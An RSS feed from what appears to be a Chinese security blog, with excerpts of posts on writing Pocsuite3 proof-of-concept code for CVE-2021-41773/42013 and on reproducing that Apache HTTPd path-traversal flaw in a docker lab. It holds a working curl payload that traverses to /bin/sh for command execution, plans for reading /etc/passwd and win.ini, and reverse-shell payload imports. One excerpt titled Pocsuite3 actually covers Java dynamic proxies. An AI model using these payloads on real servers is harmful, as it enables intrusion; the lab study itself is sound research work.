<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CVE on Oulaa</title>
    <link>/tags/cve/</link>
    <description>Recent content in CVE on Oulaa</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
</copyright>
    <lastBuildDate>Mon, 11 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/tags/cve/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Pocsuite3 POC/EXP编写</title>
      <link>/posts/j1/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/j1/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Pocsuite3 POC/EXP编写</title>
      <link>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</guid>
      <description>Pocsuite3 是一个POC框架，用于漏洞的验证、攻击等等
使用 https://github.com/knownsec/pocsuite3/blob/master/docs/USAGE.md
Pocsuite3可以进行批量验证、攻击，它有三种模式verify（验证）、attack（攻击）、shell（获得shell），并且可以设置多种参数。
编写POC 这里以CVE-2021-41773、CVE-2021-42013为例尝试使用Pocsuite3编写PoC与EXP：
思路：
分为linux与windows：
 linux  发送post包检测是否可以RCE
如果不可以的话发送get包检测是否可以目录穿越
读取对象:/etc/passwd
关键字：root
 windows  由于windows的apache无法直接调用cmd执行命令，只能通过php.exe之类的来解析，所以不考虑RCE，只判断是否可以目录穿越读取文件。
读取对象：c:/Windows/win.ini
关键字：extensions
由于两个RCE仅仅是URL编码的不同，所以这里直接使用二次URL编码来兼容两个RCE。
 注意：python的request请求包会自动进行一次编码，所以编写poc的时候不需要二次编码
使用%2e即可
实验发现不行，它会在编码之前先解码一次，解码之后会将..删除，所以换了urllib库。
 导入包 编写 PoC 实现类 DemoPOC，继承自 PoCBase 类
1 2 3 4 5 6 7 8  from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD from pocsuite3.lib.utils import random_str class DemoPOC(POCBase): ...   PoC信息字段填写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  vulID = &amp;#39;0&amp;#39; # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0 version = &amp;#39;1.</description>
    </item>
    
    <item>
      <title>Pocsuite3 POC/EXP编写</title>
      <link>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%992/</link>
      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%992/</guid>
      <description>Pocsuite3 是一个POC框架，用于漏洞的验证、攻击等等
代理对象，是我们为了在原有对象的基础上实现功能的增强、修改等而为原有对象新建立的对象，比如，我们有一个对象A，现在我们试图在对象A进行操作之前添加时间记录，那么我们就可以给对象A创建一个代理对象Aplus，它的方法调用和A没有任何区别，只是会输出时间记录。那么实现了时间记录的对象Aplus就是代理对象，原对象A就是目标对象。
一、静态代理 想要实现一个简单的代理，我们最直观的想法是直接为目标类建立一个代理类，它接受一个目标类对象，并且可以实现增强操作。
比如：
但是这样很显然有一个问题，那就是有多少个目标类就需要创建多少个对应的代理类，并且要实现同样的接口，非常不方便。
二、动态代理 如果抛开实现细节，简单地来说的话，动态代理实现了根据目标对象接口来新建对象，并且可以将新建对象与（代理对象）与目标联系起来。
JDK提供了java.lang.reflect.InvocationHandler接口和 java.lang.reflect.Proxy类配合完成动态代理功能。
我们知道，接口是无法新建对象的（它没有构造方法），所以我们需要使用java.lang.reflect.Proxy类得到代理对象：
Proxy有个静态方法：getProxyClass(ClassLoader, interfaces)，只要你给它传入类加载器和一组接口，它就给你返回代理Class对象。
由此该Class对象是从接口对象实现的，作为接口无法新建实例的替代。
所以Proxy.getProxyClass()这个方法的本质就是：以Class造Class。
在造出原有接口的构造方法以实现了可以新接口对象之后，还要考虑新的对象如何去实现方法的调用，这里的调用肯定是对目标对象的方法调用，所以有了InvocationHandler类，它可以通过反射去调用方法。
在$Proxy0 类中，是存在一个字段handler的，它就是InvocationHandler对象，每一次对
$Proxy0对象（也就是代理对象）调用某个方法的时候，它就会被导向handler.invoke方法。
以下是一个demo，实现了一个简单的动态代理：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  package org.</description>
    </item>
    
    <item>
      <title>CVE-2021-41773 Apache HTTPd (2.4.49)</title>
      <link>/posts/41773/</link>
      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/41773/</guid>
      <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
1  docker-compose build &amp;amp;&amp;amp; docker-compose up -d   二、目录穿越  不能在浏览器复现，会被自动去掉..
 三、RCE 前提：
安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
所以前提是启用mod_cgid和mod_cgi模块。
Linux上的apache实现回显RCE： 在linux上直接可以：
1 2  curl -s --path-as-is -d &amp;#39;echo Content-Type: text/plain; echo; id&amp;#39; &amp;#34;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;#34; uid=33(www-data) gid=33(www-data) groups=33(www-data)   使用burp：
1  echo Content-Type: text/plain;echo;id   原理：
直接执行命令无回显的且报500：
原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
也就是说，apache将cgi解析结果作为了http响应包的一部分。
所以才有了如上构造的payload。
windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会提示mallformed header from script，无法实现命令执行。
但是利用相应的cgi模块可以实现代码执行。
参考资料 https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ
https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
    </item>
    
  </channel>
</rss>
